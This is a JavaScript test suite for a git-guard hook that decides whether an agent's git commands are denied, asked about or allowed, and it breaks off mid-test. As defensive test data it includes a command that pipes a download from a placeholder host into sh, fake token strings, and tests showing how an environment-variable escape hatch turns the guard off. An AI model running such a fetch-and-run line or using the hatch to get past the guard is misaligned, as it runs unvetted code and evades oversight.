// agentic-teamwork's git-guard.mjs: the deny, ask and allow table, driven over
// stdin exactly as the host drives it. Every case is a command somebody types.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { after, test } from "node:test";
import { REPO, runNode, tempDir, tempRepo, write } from "./helpers.mjs";

const GUARD = path.join(REPO, "plugins", "agentic-teamwork", "hooks", "git-guard.mjs");
const suite = { after };
// An empty home, so no developer setting or git config reaches a fixture, and
// a temp directory of its own, so the session records land nowhere shared.
const HOME = tempDir(suite, "tw-guard-home-");
const TMP = tempDir(suite, "tw-guard-tmp-");

const MANIFEST = { standard: "agentic-engineering", standard_version: 1, project: "fixture", default_branch: "main", lanes: { unit: "npm test", e2e: "cd e2e && npx playwright test" }, owned: {} };
// Commands any shell can run, for the test gate.
const node = (code) => `"${process.execPath}" -e "${code}"`;
const PASSING = node("process.exit(0)");
const FAILING = node("console.log('1 failing: adds two numbers'); process.exit(1)");

/**
 * A repo with one commit and something staged. `teamwork` is the manifest's
 * opt-in block; `manifest: false` leaves the marker out; `choice` records the
 * person's answer instead; `old` writes the first layout's settings file.
 */
function guardRepo(t, { branch = "feat/topic", staged = { "src/a.mjs": "export const a = 1;\n" }, manifest = true, teamwork, choice, old, remote, tracked = {} } = {}) {
  const { dir, git } = tempRepo(t, "tw-guard-");
  if (manifest) write(dir, ".agents/manifest.json", JSON.stringify({ ...MANIFEST, ...(teamwork ? { teamwork } : {}) }, null, 2));
  if (old) write(dir, ".claude/teamwork.json", JSON.stringify(old, null, 2));
  if (choice) git("config", "--local", "agentic-engineering.plugins", `${choice} Test 2026-01-01T00:00Z`);
  if (remote) git("remote", "add", "origin", remote);
  write(dir, "README.md", "# fixture\n");
  for (const [rel, content] of Object.entries(tracked)) write(dir, rel, content);
  git("add", "-A");
  git("commit", "-q", "-m", "first");
  if (branch !== "main") git("switch", "-q", "-c", branch);
  for (const [rel, content] of Object.entries(staged)) write(dir, rel, content);
  git("add", "-A");
  return { dir, git };
}

// The guard changes nothing in a repo, so the tables below share one each,
// made once the helpers exist (see the end of the file).
const kept = new Map();
const shared = (name) => kept.get(name);

function guard(command, { dir, session = "guard", cwd = dir, project = dir, tool = "Bash" } = {}) {
  const payload = JSON.stringify({ hook_event_name: "PreToolUse", tool_name: tool, tool_input: { command }, session_id: session, cwd });
  const env = { ...process.env, HOME, USERPROFILE: HOME, CLAUDE_CONFIG_DIR: path.join(HOME, ".claude"), CLAUDE_PROJECT_DIR: project, TMPDIR: TMP };
  const result = runNode(GUARD, [], { cwd, env, input: payload });
  assert.equal(result.status, 0, `${command}: ${result.stderr}`);
  assert.equal(result.stderr, "", `${command} wrote to stderr`);
  return { ...result, json: result.stdout.trim() ? JSON.parse(result.stdout) : null };
}

const decisionOf = (out) => out.json?.hookSpecificOutput?.permissionDecision ?? null;
const reasonOf = (out) => out.json?.hookSpecificOutput?.permissionDecisionReason ?? "";
const record = (session) => { try { return JSON.parse(fs.readFileSync(path.join(TMP, `agentic-teamwork-${session}.json`), "utf8")); } catch { return null; } };

// ---- what is refused -----------------------------------------------------

const DENIED = [
  ["git push --force origin main", /Force pushing/],
  ["git push --force-with-lease", /Force pushing/],
  ["git push --force-if-includes origin feat/topic", /Force pushing/],
  ["git push -f origin main", /Force pushing/],
  ["git push -uf origin feat/topic", /Force pushing/],
  ["git push origin +feat/topic", /Force pushing/],
  ["git commit --no-verify -m x", /--no-verify/],
  ["git commit -n -m x", /--no-verify/],
  ["git commit -anm x", /--no-verify/],
  ["git push --no-verify", /--no-verify/],
  ["git push origin HEAD:main", /Pushing to main is not allowed/],
  ["git push origin feat/topic:refs/heads/main", /Pushing to main is not allowed/],
  ["git push origin --delete main", /Pushing to main is not allowed/],
];
for (const [command, reason] of DENIED) {
  test(`deny: ${command}`, () => {
    const out = guard(command, shared("branch"));
    assert.equal(decisionOf(out), "deny", out.stdout);
    assert.match(reasonOf(out), reason);
  });
}

test("deny: committing on the protected branch, with the way out", (t) => {
  const out = guard("git commit -m 'a change'", guardRepo(t, { branch: "main", remote: "git@github.com:someone/x.git" }));
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /Committing to main is not allowed: it moves only through a pull request\. Branch first \(git switch -c <type>\/<topic>\)/);
});

test("the refusal speaks the forge's language and the repo's branch prefix", (t) => {
  const repo = guardRepo(t, { branch: "main", remote: "https://gitlab.example.invalid/group/x.git", teamwork: { branchPrefixes: ["feature/", "fix/"] } });
  const out = guard("git commit -m x", repo);
  assert.match(reasonOf(out), /through a merge request\. Branch first \(git switch -c feature\/<topic>\)/);
});

test("deny: a bare push, or a push of HEAD, from the protected branch", (t) => {
  const repo = guardRepo(t, { branch: "main" });
  for (const command of ["git push", "git push origin", "git push origin HEAD"]) {
    const out = guard(command, repo);
    assert.equal(decisionOf(out), "deny", `${command}: ${out.stdout}`);
    assert.match(reasonOf(out), /Pushing to main/);
  }
});

test("deny: staged junk", (t) => {
  const out = guard("git commit -m x", guardRepo(t, { staged: { ".env": "NAME=value\n", "pkg/node_modules/x/index.js": "x\n" } }));
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /must never be committed/);
  assert.match(reasonOf(out), /^\.env$/m);
  assert.match(reasonOf(out), /^pkg\/node_modules\/x\/index\.js$/m);
});

test("deleting a tracked junk file is allowed: only adding one is refused", (t) => {
  const repo = guardRepo(t, { tracked: { ".DS_Store": "junk that got in before the guard\n" }, staged: {} });
  repo.git("rm", "-q", ".DS_Store");
  assert.equal(guard("git commit -m 'remove the junk'", repo).json, null);
});

test("an env file that only documents the variables is not junk", (t) => {
  const repo = guardRepo(t, { staged: { ".env.example": "NAME=\n", "api/.env.sample": "NAME=\n", ".env.template": "NAME=\n" } });
  assert.equal(guard("git commit -m 'document the variables'", repo).json, null);
  write(repo.dir, ".env.local", "NAME=value\n");
  repo.git("add", "-A");
  assert.match(reasonOf(guard("git commit -m x", repo)), /^\.env\.local$/m);
});

test("junk the same command is about to stage is caught before it is staged", (t) => {
  const repo = guardRepo(t, { staged: {} });
  write(repo.dir, ".env", "NAME=value\n");
  write(repo.dir, "src/b.mjs", "export const b = 2;\n");
  for (const command of ["git add -A && git commit -m x", "git add . && git commit -m x", "git add .env; git commit -m x"]) {
    const out = guard(command, repo);
    assert.equal(decisionOf(out), "deny", `${command}: ${out.stdout}`);
    assert.match(reasonOf(out), /^\.env$/m);
  }
  assert.equal(guard("git add src/b.mjs && git commit -m x", repo).json, null, "an add that names another file stages no junk");
});

test("the repo's own junkPatterns replace the defaults", (t) => {
  const repo = guardRepo(t, { teamwork: { junkPatterns: ["\\.log$"] }, staged: { "run.log": "x\n" } });
  assert.match(reasonOf(guard("git commit -m x", repo)), /^run\.log$/m);
});

test("deny: a staged credential, reported as file:line and never as the value", (t) => {
  const token = `glpat-${"A".repeat(24)}`;
  const out = guard("git commit -m x", guardRepo(t, { staged: { "config.mjs": `// settings\nexport const token = "${token}";\n` } }));
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /config\.mjs \(staged\):2/);
  assert.equal(out.stdout.includes(token), false, "the guard printed the token");
});

test("a credential the same command is about to stage is caught in the work tree", (t) => {
  const repo = guardRepo(t, { staged: {}, tracked: { "config.mjs": "export const token = null;\n" } });
  write(repo.dir, "config.mjs", `export const token = "ghp_${"a".repeat(36)}";\n`);
  for (const command of ["git commit -am x", "git add -u && git commit -m x", "git add config.mjs && git commit -m x"]) {
    const out = guard(command, repo);
    assert.equal(decisionOf(out), "deny", `${command}: ${out.stdout}`);
    assert.match(reasonOf(out), /config\.mjs:1/);
  }
  assert.equal(guard("git commit -m x", repo).json, null, "a plain commit takes the index, which holds no credential");
});

test("secretPatternsExtra adds the repo's own credential shapes", (t) => {
  const staged = { "pay.mjs": 'const key = "sk_live_abcdefgh1234";\n' };
  assert.equal(guard("git commit -m x", guardRepo(t, { staged })).json, null, "not a built-in shape");
  const out = guard("git commit -m x", guardRepo(t, { staged, teamwork: { secretPatternsExtra: ["sk_live_[[:alnum:]]{8,}"] } }));
  assert.match(reasonOf(out), /pay\.mjs \(staged\):1/);
});

// ---- what passes without a word ------------------------------------------

const ALLOWED = [
  "git log --oneline",
  "git status",
  "git diff --cached",
  'echo "git commit -m x"',
  "echo git push --force",
  "git switch -c feat/other",
  "npm test",
  "git commit -m 'a change'",
  'git commit -m "docs: why we never git push --force"',
  "git commit -m \"note\" -m '-n is not a flag here'",
  "git commit -mnote",
  "git commit -uno -m x",
  "git commit -F message.txt",
  "git commit -m \"$(cat <<'EOF'\nfix: the parser\n\ngit push --force is still refused; --no-verify too\nEOF\n)\"",
  "# git push --force would be refused\ngit status",
];
for (const command of ALLOWED) {
  test(`no decision: ${command.split("\n")[0]}`, () => {
    assert.equal(guard(command, shared("branch")).json, null);
  });
}

// ---- a push asks ---------------------------------------------------------

test("a push that breaks no rule asks rather than denying", (t) => {
  const out = guard("git push -u origin feat/topic", guardRepo(t));
  assert.equal(decisionOf(out), "ask");
  assert.match(reasonOf(out), /About to push from feat\/topic\. Pushing is the point where work leaves this machine/);
});

// ---- the push grant ------------------------------------------------------
// A person can approve a branch's push ahead of time, recorded on the branch
// as branch.<b>.agentic-engineering-push. That branch's own plain push then
// goes through without a prompt, and nothing else changes: every rule that
// denies still denies, and every other push still asks.

const GRANT = "Pat 2026-10-28T12:00:00Z: push and open the request";
const ORIGIN = "https://github.com/someone/x.git";

function grantedRepo(t, { branch = "feat/topic", granted = branch, grant = GRANT, ...rest } = {}) {
  const repo = guardRepo(t, { branch, remote: ORIGIN, ...rest });
  if (granted) repo.git("config", `branch.${granted}.agentic-engineering-push`, grant);
  return repo;
}

test("a granted push of the branch's own work is allowed, quoting the grant", (t) => {
  const out = guard("git push -u origin feat/topic", grantedRepo(t));
  assert.equal(decisionOf(out), "allow", out.stdout);
  assert.ok(reasonOf(out).includes(GRANT), reasonOf(out));
});

// Every refspec form a grant accepts names the current branch and nothing else.
const GRANTED_PUSHES = [
  "git push origin",
  "git push origin HEAD",
  "git push origin feat/topic",
  "git push origin HEAD:feat/topic",
  "git push origin feat/topic:feat/topic",
  "git push --set-upstream origin feat/topic",
  'git push -u origin "$(git branch --show-current)"',
];
for (const command of GRANTED_PUSHES) {
  test(`granted: ${command}`, () => {
    assert.equal(decisionOf(guard(command, shared("granted"))), "allow", command);
  });
}

test("a cd into the granted repo still lets its push through", (t) => {
  const { dir } = grantedRepo(t);
  for (const command of [`cd ${dir} && git push -u origin feat/topic`, `cd "${dir}" && git push -u origin "$(git branch --show-current)"`]) {
    assert.equal(decisionOf(guard(command, guardRepo(t))), "allow", command);
  }
});

test("with no grant, or an empty one, the push asks", (t) => {
  for (const repo of [grantedRepo(t, { granted: null }), grantedRepo(t, { grant: "" })]) {
    assert.equal(decisionOf(guard("git push -u origin feat/topic", repo)), "ask");
  }
});

test("a grant on one branch does nothing for another", (t) => {
  const repo = grantedRepo(t, { granted: "feat/other" });
  repo.git("branch", "feat/other");
  for (const command of ["git push -u origin feat/topic", "git push origin feat/other", "git push origin HEAD:feat/other"]) {
    assert.equal(decisionOf(guard(command, repo)), "ask", command);
  }
});

// What denies without a grant denies with one: the grant only replaces an ask.
const DENIED_WITH_GRANT = [
  ["git push --force origin feat/topic", /Force pushing/],
  ["git push -f origin feat/topic", /Force pushing/],
  ["git push origin +feat/topic", /Force pushing/],
  ["git push --no-verify origin feat/topic", /--no-verify/],
  ["git push origin HEAD:main", /Pushing to main/],
];
for (const [command, reason] of DENIED_WITH_GRANT) {
  test(`denied even with a grant: ${command}`, () => {
    const out = guard(command, shared("granted"));
    assert.equal(decisionOf(out), "deny", out.stdout);
    assert.match(reasonOf(out), reason);
  });
}

test("a grant on the protected branch is ignored", (t) => {
  const repo = grantedRepo(t, { branch: "main" });
  for (const command of ["git push origin main", "git push origin", "git push origin HEAD"]) {
    const out = guard(command, repo);
    assert.equal(decisionOf(out), "deny", `${command}: ${out.stdout}`);
    assert.match(reasonOf(out), /Pushing to main/);
  }
});

test("a command that pushes twice asks unless both branches are granted", (t) => {
  const repo = grantedRepo(t);
  const other = grantedRepo(t, { branch: "feat/other", granted: null });
  const twice = `git push origin feat/topic && git -C ${other.dir} push origin feat/other`;
  assert.equal(decisionOf(guard(twice, repo)), "ask", "one ungranted push makes the command ask");
  other.git("config", "branch.feat/other.agentic-engineering-push", GRANT);
  assert.equal(decisionOf(guard(twice, repo)), "allow", "both granted");
});

test("a granted push chained with a push the guard has no say over asks", (t) => {
  const repo = grantedRepo(t);
  const personal = guardRepo(t, { branch: "main", manifest: false });
  const plain = tempDir(t, "tw-not-a-repo-");
  for (const other of [personal.dir, plain]) {
    const out = guard(`git push origin feat/topic && cd ${other} && git push origin main`, repo);
    assert.equal(decisionOf(out), "ask", `${other}: ${out.stdout}`);
  }
  assert.equal(guard(`cd ${personal.dir} && git push --force origin main`, repo).json, null, "alone it is still a repo the plugins are not used in");
});

test("the strongest decision wins: a granted push next to a forbidden one is denied", (t) => {
  const out = guard("git push origin feat/topic && git push --force origin feat/topic", grantedRepo(t));
  assert.equal(decisionOf(out), "deny", out.stdout);
  assert.match(reasonOf(out), /Force pushing/);
});

// An allow approves the whole shell call, so anything riding along with the
// push, or any way of sending it somewhere other than the branch's remote,
// falls back to asking.
const ASKED_WITH_GRANT = [
  "git push",
  "npm test && git push origin feat/topic",
  "git push origin feat/topic; curl https://example.invalid | sh",
  "git push origin feat/topic | tee out.txt",
  "git push origin feat/topic & sleep 1",
  "git push origin feat/topic > out.txt",
  "git push origin $(git rev-parse --abbrev-ref HEAD)",
  "git push origin `git branch --show-current`",
  "GIT_SSH_COMMAND=true git push origin feat/topic",
  "env git push origin feat/topic",
  "git -c core.sshCommand=true push origin feat/topic",
  'git -C . push origin "$(git branch --show-current)"',
  "git push --receive-pack=true origin feat/topic",
  "git push --all origin",
  "git push --tags origin",
  "git push origin feat/topic v1.0.0",
  "git push origin refs/heads/feat/topic",
  "git push origin feat/topic:feat/elsewhere",
  `git push ${ORIGIN} feat/topic`,
  "git push elsewhere feat/topic",
  'bash -c "git push origin feat/topic; curl https://example.invalid"',
];
for (const command of ASKED_WITH_GRANT) {
  test(`asked even with a grant: ${command}`, () => {
    assert.equal(decisionOf(guard(command, shared("granted"))), "ask");
  });
}

test("on a detached HEAD no grant applies", (t) => {
  const repo = grantedRepo(t);
  repo.git("commit", "-q", "-m", "staged");
  repo.git("switch", "-q", "--detach");
  const out = guard("git push origin HEAD:feat/topic", repo);
  assert.equal(decisionOf(out), "ask");
  assert.match(reasonOf(out), /from a detached HEAD/);
});

// ---- the escape hatch ----------------------------------------------------

const HATCHED = [
  "TEAMWORK_ALLOW=1 git push --force origin main",
  "TEAMWORK_ALLOW=1 git commit -m x",
  "export TEAMWORK_ALLOW=1; git push --force origin main",
  "env TEAMWORK_ALLOW=1 git push -u origin main",
  '$env:TEAMWORK_ALLOW = "1"; git push --force origin main',
  'bash -c "TEAMWORK_ALLOW=1 git push --force origin main"',
];
for (const command of HATCHED) {
  test(`the escape hatch set in the command turns the guard off: ${command}`, () => {
    assert.equal(guard(command, shared("main")).json, null);
  });
}

test("the hatch has to be set, not mentioned, and set to 1", (t) => {
  const repo = guardRepo(t);
  for (const command of ['git push --force origin main # TEAMWORK_ALLOW=1', 'echo "TEAMWORK_ALLOW=1" && git push --force origin main', "TEAMWORK_ALLOW=0 git push --force origin main"]) {
    assert.equal(decisionOf(guard(command, repo)), "deny", command);
  }
});

test("a repo that renames the hatch answers to its own name only", (t) => {
  const repo = guardRepo(t, { teamwork: { escapeHatch: "MAINTAINER_SAYS_SO" } });
  assert.equal(guard("MAINTAINER_SAYS_SO=1 git push --force origin main", repo).json, null);
  const out = guard("TEAMWORK_ALLOW=1 git push --force origin main", repo);
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /MAINTAINER_SAYS_SO=1/);
});

// ---- reading the command -------------------------------------------------

test("an environment prefix does not hide a push from the guard", (t) => {
  const out = guard("FOO=1 git push", guardRepo(t, { branch: "main" }));
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /Pushing to main/);
});

test("a compound command is split, and each git call is judged", (t) => {
  const repo = guardRepo(t, { branch: "main" });
  for (const command of ["npm test && git commit -m x", "npm test; git commit -m x", "npm test || git commit -m x", "npm test\ngit commit -m x", "(cd . && git commit -m x)"]) {
    const out = guard(command, repo);
    assert.equal(decisionOf(out), "deny", command);
    assert.match(reasonOf(out), /Committing to main/);
  }
});

const BEHIND_SOMETHING = [
  "sudo git push --force origin feat/topic",
  "time git push --force origin feat/topic",
  "timeout 60 git push --force origin feat/topic",
  "/usr/bin/git push --force origin feat/topic",
  "git.exe push --force origin feat/topic",
  "git --no-pager -c color.ui=never push --force origin feat/topic",
  "runner exec --quiet -- git push --force origin feat/topic",
  'runner exec -- "git status && git push --force origin feat/topic"',
  'bash -lc "git push --force origin feat/topic"',
  "sh -c 'cd . && git push --force origin feat/topic'",
];
for (const command of BEHIND_SOMETHING) {
  test(`git behind a runner, a wrapper or a shell is still judged: ${command}`, () => {
    const out = guard(command, shared("branch"));
    assert.equal(decisionOf(out), "deny", out.stdout);
    assert.match(reasonOf(out), /Force pushing/);
  });
}

// PowerShell reaches the guard two ways: as a `powershell -Command "..."` the
// bash tool runs, and as the PowerShell tool's own command line.
const POWERSHELL = [
  ['powershell -NoProfile -Command "git commit -m x"', /Committing to main/],
  ['powershell -Command "git status; git commit -m x"', /Committing to main/],
  ["pwsh -c 'git add -A; git push --force origin main'", /Force pushing/],
  ['powershell.exe -NoProfile -Command "& git commit --no-verify -m x"', /--no-verify/],
  ["git status; git commit -m 'a; b'; git log", /Committing to main/],
  ["Set-Location .; git push origin main", /Pushing to main/],
  ["git commit -m @'\nfix: the parser\n'@ --no-verify", /--no-verify/],
];
for (const [command, reason] of POWERSHELL) {
  test(`powershell: ${command.split("\n")[0]}`, () => {
    const out = guard(command, { ...shared("main"), tool: "PowerShell" });
    assert.equal(decisionOf(out), "deny", out.stdout);
    assert.match(reasonOf(out), reason);
  });
}

test("powershell: a here-string that mentions a force push is a message, not a push", (t) => {
  const command = "git commit -m @'\nrefuse git push --force; and --no-verify\n'@";
  assert.equal(guard(command, { ...guardRepo(t), tool: "PowerShell" }).json, null);
});

test("powershell: Set-Location into another repo is judged on that repo", (t) => {
  const project = guardRepo(t, { branch: "feat/topic" });
  const other = guardRepo(t, { branch: "main" });
  const out = guard(`powershell -Command "Set-Location '${other.dir}'; git commit -m x"`, project);
  assert.equal(decisionOf(out), "deny", out.stdout);
  assert.match(reasonOf(out), /Committing to main/);
});

// ---- the repo the command runs in ----------------------------------------
// The session is in one repo; the command may name another. Reading the
// session's branch for a commit in a second checkout is how a legitimate
// commit gets denied for a branch it is not on.

test("a cd into another repo is judged on that repo's branch, not the session's", (t) => {
  const project = guardRepo(t, { branch: "main" });
  const other = guardRepo(t, { branch: "feat/elsewhere" });
  assert.equal(guard(`cd ${other.dir} && git commit -m x`, project).json, null);
});

test("a cd into another repo still denies what that repo forbids", (t) => {
  const project = guardRepo(t, { branch: "feat/topic" });
  const other = guardRepo(t, { branch: "main" });
  for (const command of [`cd ${other.dir} && git commit -m x`, `cd "${other.dir}" && git commit -m x`, `pushd '${other.dir}'; git commit -m x`]) {
    const out = guard(command, project);
    assert.equal(decisionOf(out), "deny", command);
    assert.match(reasonOf(out), /Committing to main is not allowed/);
  }
});

test("a relative cd is followed from the session's folder", (t) => {
  const project = guardRepo(t, { branch: "main" });
  write(project.dir, "pkg/x.mjs", "export {};\n");
  const out = guard("cd pkg && git commit -m x", project);
  assert.equal(decisionOf(out), "deny");
});

test("git -C names the repo for that command only", (t) => {
  const project = guardRepo(t, { branch: "main" });
  const other = guardRepo(t, { branch: "feat/elsewhere" });
  assert.equal(guard(`git -C ${other.dir} commit -m x`, project).json, null);
  const out = guard(`git -C ${other.dir} status && git commit -m x`, project);
  assert.equal(decisionOf(out), "deny", "the next command is back in the session's repo");
});

test("a cd to a path that is not a repo produces no output", (t) => {
  const project = guardRepo(t, { branch: "main" });
  const plain = tempDir(t, "tw-not-a-repo-");
  for (const command of [`cd ${plain} && git commit -m x`, `cd ${path.join(plain, "nope")} && git push --force`]) {
    assert.equal(guard(command, project).json, null, command);
  }
});

test("where the text does not say which folder, the session's repo is judged", (t) => {
  const out = guard('cd "$WORK" && git commit -m x', guardRepo(t, { branch: "main" }));
  assert.equal(decisionOf(out), "deny");
});

test("a session whose cwd is another work tree is judged by that work tree", (t) => {
  const main = guardRepo(t, { branch: "main", staged: {} });
  const worktree = path.join(main.dir, ".claude", "worktrees", "feat-x");
  main.git("worktree", "add", "-q", "-b", "feat/x", worktree);
  write(worktree, "src/b.mjs", "export const b = 1;\n");
  assert.equal(guard("git add src/b.mjs && git commit -m b", { dir: main.dir, cwd: worktree, project: main.dir }).json, null, "its own branch is not the main checkout's");
  const out = guard("git commit -m b", { dir: main.dir, cwd: main.dir, project: main.dir });
  assert.equal(decisionOf(out), "deny", "the main checkout is still on main");
});

// ---- which repos the guard speaks in -------------------------------------

test("mode none: a repo nobody answered for, or answered off, is not guarded", (t) => {
  for (const repo of [guardRepo(t, { branch: "main", manifest: false }), guardRepo(t, { branch: "main", manifest: false, choice: "off" })]) {
    for (const command of ["git commit -m x", "git push --force origin main", "git commit --no-verify -m x", "git push"]) {
      assert.equal(guard(command, repo).json, null, command);
    }
  }
});

test("portable mode: the discipline is enforced, the branch conventions are not", (t) => {
  const token = `AKIA${"A".repeat(16)}`;
  const repo = guardRepo(t, { branch: "main", manifest: false, choice: "on", staged: { "src/a.mjs": "export const a = 1;\n" } });
  assert.equal(guard("git commit -m x", repo).json, null, "committing on main is this repo's own business");
  assert.equal(decisionOf(guard("git push origin main", repo)), "ask", "a push still asks");
  assert.equal(decisionOf(guard("git push --force origin main", repo)), "deny");
  assert.equal(decisionOf(guard("git commit --no-verify -m x", repo)), "deny");
  write(repo.dir, "keys.mjs", `export const k = "${token}";\n`);
  repo.git("add", "-A");
  assert.match(reasonOf(guard("git commit -m x", repo)), /keys\.mjs \(staged\):1/);
});

test("answered team with no manifest yet: the conventions apply, main and master protected", (t) => {
  const repo = guardRepo(t, { branch: "main", manifest: false, choice: "team" });
  const out = guard("git commit -m x", repo);
  assert.equal(decisionOf(out), "deny");
  assert.match(reasonOf(out), /Committing to main/);
});

test("the mode is decided per repo: a cd into one that is off is silent", (t) => {
  const project = guardRepo(t, { branch: "feat/topic" });
  const other = guardRepo(t, { branch: "main", manifest: false });
  assert.equal(guard(`cd ${other.dir} && git commit -m x`, project).json, null);
});

// ---- day one -------------------------------------------------------------

/** A repo with something staged and no commit at all, still on main. */
function unbornRepo(t, { manifest = true, old } = {}) {
  const { dir, git } = tempRepo(t, "tw-guard-unborn-");
  if (manifest) write(dir, ".agents/manifest.json", JSON.stringify(MANIFEST));
  if (old) write(dir, ".claude/teamwork.json", JSON.stringify(old));
  write(dir, "src/a.mjs", "export const a = 1;\n");
  git("add", "-A");
  return { dir, git };
}

test("the first commit of a repo lands on its default branch: an unborn branch has nothing to protect", (t) => {
  assert.equal(guard("git commit -m 'chore: first commit'", unbornRepo(t)).json, null);
  assert.equal(guard("git commit -m 'chore: first commit'", unbornRepo(t, { manifest: false, old: { version: 1 } })).json, null, "the first layout too");
});

test("the first commit is still checked for credentials", (t) => {
  const repo = unbornRepo(t);
  write(repo.dir, "config.mjs", `export const key = "glpat-${"a".repeat(20)}";\n`);
  repo.git("add", "-A");
  const out = guard("git commit -m first", repo);
  assert.equal(decisionOf(out), "deny", out.stdout);
  assert.match(reasonOf(out), /Possible credentials/);
});

// ---- the settings --------------------------------------------------------

test("protectedBranches replaces the default branch as what is protected", (t) => {
  const teamwork = { protectedBranches: ["main", "release"] };
  const onRelease = guardRepo(t, { branch: "release", teamwork });
  assert.match(reasonOf(guard("git commit -m x", onRelease)), /Committing to release/);
  assert.match(reasonOf(guard("git push origin HEAD:release", guardRepo(t, { teamwork }))), /Pushing to release/);
});

test("master is not protected in a repo whose manifest names main", (t) => {
  assert.equal(guard("git commit -m x", guardRepo(t, { branch: "master" })).json, null);
});

const SWITCHES = [
  ["blockCommitOnProtected", "main", "git commit -m x", null],
  ["blockPushToProtected", "feat/topic", "git push origin HEAD:main", "ask"],
  ["blockForcePush", "feat/topic", "git push --force origin feat/topic", "ask"],
  ["blockNoVerify", "feat/topic", "git commit --no-verify -m x", null],
  ["askBeforePush", "feat/topic", "git push -u origin feat/topic", null],
];
for (const [rule, branch, command, left] of SWITCHES) {
  test(`rules.${rule}: false turns that one rule off`, (t) => {
    assert.notEqual(decisionOf(guard(command, guardRepo(t, { branch }))), left, "on by default");
    assert.equal(decisionOf(guard(command, guardRepo(t, { branch, teamwork: { rules: { [rule]: false } } }))), left);
  });
}

test("rules.blockJunk and rules.blockSecrets: false turn those scans off", (t) => {
  const staged = { ".env": "NAME=value\n", "k.mjs": `const k = "AKIA${"B".repeat(16)}";\n` };
  assert.match(reasonOf(guard("git commit -m x", guardRepo(t, { staged, teamwork: { rules: { blockJunk: false } } }))), /Possible credentials/);
  assert.match(reasonOf(guard("git commit -m x", guardRepo(t, { staged, teamwork: { rules: { blockSecrets: false } } }))), /must never be committed/);
  assert.equal(guard("git commit -m x", guardRepo(t, { staged, teamwork: { rules: { blockJunk: false, blockSecrets: false } } })).json, null);
});

// ---- the opt-in test gate ------------------------------------------------

test("without requireTestsPass no test is run before a commit", (t) => {
  const repo = guardRepo(t, { teamwork: { test: { command: FAILING } } });
  assert.equal(guard("git commit -m x", repo).json, null);
});

test("requireTestsPass: a failing test command denies the commit, with its output", (t) => {
  const repo = guardRepo(t, { teamwork: { requireTestsPass: true, test: { command: FAILING } } });
  const out = guard("git commit -m x", repo);
  assert.equal(decisionOf(out), "deny", out.stdout);
  assert.match(reasonOf(out), /must pass before every commit in this repo \(requireTestsPass in \.agents\/manifest\.json\)/);
  assert.match(reasonOf(out), /1 failing: adds two numbers/);
});

test("requireTestsPass: a passing test command lets the commit through, and a push is not gated", (t) => {
  const repo = guardRepo(t, { teamwork: { requireTestsPass: true, test: { command: PASSING } } });
  assert.equal(guard("git commit -m x", repo).json, null);
  const failing = guardRepo(t, { teamwork: { requireTestsPass: true, test: { command: FAILING } } });
  assert.equal(decisionOf(guard("git push -u origin feat/topic", failing)), "ask");
});

test("requireTestsPass is read from rules too, runs in test.dir, and falls back to build.command", (t) => {
  const inDir = guardRepo(t, { teamwork: { rules: { requireTestsPass: true }, test: { command: node("process.exit(require('fs').existsSync('marker.txt') ? 1 : 0)"), dir: "pkg" } }, tracked: { "pkg/marker.txt": "here\n" } });
  assert.equal(decisionOf(guard("git commit -m x", inDir)), "deny", "the command ran in pkg, where the marker is");
  const build = guardRepo(t, { teamwork: { requireTestsPass: true, build: { command: FAILING } } });
  assert.equal(decisionOf(guard("git commit -m x", build)), "deny");
  const neither = guardRepo(t, { teamwork: { requireTestsPass: true } });
  assert.equal(guard("git commit -m x", neither).json, null, "nothing to run is nothing to fail");
  const missing = guardRepo(t, { teamwork: { requireTestsPass: true, test: { command: PASSING, dir: "nowhere" } } });
  assert.match(reasonOf(guard("git commit -m x", missing)), /could not run: nowhere does not exist/);
});

test("the cheap refusals come before the test run", (t) => {
  const repo = guardRepo(t, { branch: "main", teamwork: { requireTestsPass: true, test: { command: FAILING } } });
  assert.match(reasonOf(guard("git commit -m x", repo)), /Committing to main/);
});

// ---- a repo still on the first layout ------------------------------------

test("a repo whose rules are still in .claude/teamwork.json keeps every one of them", (t) => {
  const old = { version: 1, baseBranch: "main", protectedBranches: ["main", "master"], escapeHatch: "TEAMWORK_ALLOW", test: { command: FAILING, dir: "." }, rules: { requireTestsPass: true } };
  const onMaster = guardRepo(t, { branch: "master", manifest: false, old });
  assert.match(reasonOf(guard("git commit -m x", onMaster)), /Committing to master/);
  const onBranch = guardRepo(t, { manifest: false, old });
  assert.match(reasonOf(guard("git commit -m x", onBranch)), /1 failing: adds two numbers/, "passing tests were a hard gate there");
  assert.equal(decisionOf(guard("git push --force origin feat/topic", onBranch)), "deny");
  const relaxed = guardRepo(t, { manifest: false, old: { ...old, rules: { requireTestsPass: false, blockForcePush: false } } });
  assert.equal(guard("git commit -m x", relaxed).json, null, "a switch it turned off stays off");
  assert.equal(decisionOf(guard("git push --force origin feat/topic", relaxed)), "ask");
});

// ---- the record of test runs ---------------------------------------------

test("a test command is noted for the stop gate, with the lanes it runs", (t) => {
  const repo = guardRepo(t);
  guard("npm test", { ...repo, session: "rec-unit" });
  assert.deepEqual(record("rec-unit").testRuns.map((r) => r.lanes), [["unit"]]);
  guard("cd e2e && npx playwright test", { ...repo, session: "rec-e2e" });
  assert.deepEqual(record("rec-e2e").testRuns[0].lanes, ["e2e"]);
  guard("npm test:watch", { ...repo, session: "rec-other" });
  assert.deepEqual(record("rec-other").testRuns[0].lanes, [], "a longer command is a test run, and not the unit lane's");
  guard("pytest -q tests/", { ...repo, session: "rec-runner" });
  assert.deepEqual(record("rec-runner").testRuns[0].lanes, [], "a runner outside the lanes still counts as a test run");
});

test("what is not a test run is not noted", (t) => {
  const repo = guardRepo(t);
  guard('git commit -m "ci: move jest to the unit lane"', { ...repo, session: "rec-message" });
  guard("ls -la", { ...repo, session: "rec-ls" });
  assert.equal(record("rec-message"), null);
  assert.equal(record("rec-ls"), null);
  guard("npm test", { ...guardRepo(t, { manifest: false }), session: "rec-none" });
  assert.equal(record("rec-none"), null, "nothing is kept for a repo in mode none");
});

// ---- the contract --------------------------------------------------------

test("empty, malformed and unexpected stdin are silent no-ops", (t) => {
  const { dir } = guardRepo(t, { branch: "main" });
  for (const input of ["", "{ not json", "null", "[]", '{"tool_input":{"command":42}}', '{"tool_input":{}}']) {
